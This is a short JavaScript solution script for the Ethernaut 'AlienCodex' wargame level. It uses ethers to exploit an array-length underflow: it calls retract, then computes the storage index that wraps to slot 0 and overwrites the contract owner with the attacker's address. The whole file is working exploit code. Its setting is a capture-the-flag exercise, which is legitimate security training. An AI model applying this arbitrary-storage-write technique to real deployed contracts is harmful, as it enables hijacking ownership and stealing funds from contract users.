const {
    ALIEN_CODEX_INSTANCE_ADDRESS,
    logStartingLevel,
    logSuccessfullyLevel,
    logInstanceAddressIsNull,
    logInstanceAddress,
    logTransactionLink,
} = require('./utils');

async function main(levelName = 'AlienCodex') {
    logStartingLevel(levelName);

    if (!ALIEN_CODEX_INSTANCE_ADDRESS) {
        logInstanceAddressIsNull(levelName);
        return;
    }
    logInstanceAddress(levelName, ALIEN_CODEX_INSTANCE_ADDRESS);

    const [attacker] = await ethers.getSigners();

    const factory = await ethers.getContractFactory("AlienCodex");
    const contract = factory.attach(ALIEN_CODEX_INSTANCE_ADDRESS);

    let tx;
    tx = await contract.make_contact();
    logTransactionLink(tx.hash);
    await tx.wait(1);

    tx = await contract.retract();
    await tx.wait(1);

    const mapLengthAddress = "0x0000000000000000000000000000000000000000000000000000000000000001";
    const mapStartSlot = ethers.BigNumber.from(ethers.utils.keccak256(mapLengthAddress));

    const NUMBER_OF_SLOTS = ethers.BigNumber.from("2").pow("256");
    const ownerPositionInMap = NUMBER_OF_SLOTS.sub(mapStartSlot);

    const parsedAddress = ethers.utils.hexZeroPad(attacker.address, 32);

    tx = await contract.revise(ownerPositionInMap, parsedAddress);
    logTransactionLink(tx.hash);
    await tx.wait(1);

    logSuccessfullyLevel(levelName);
}

module.exports = main;
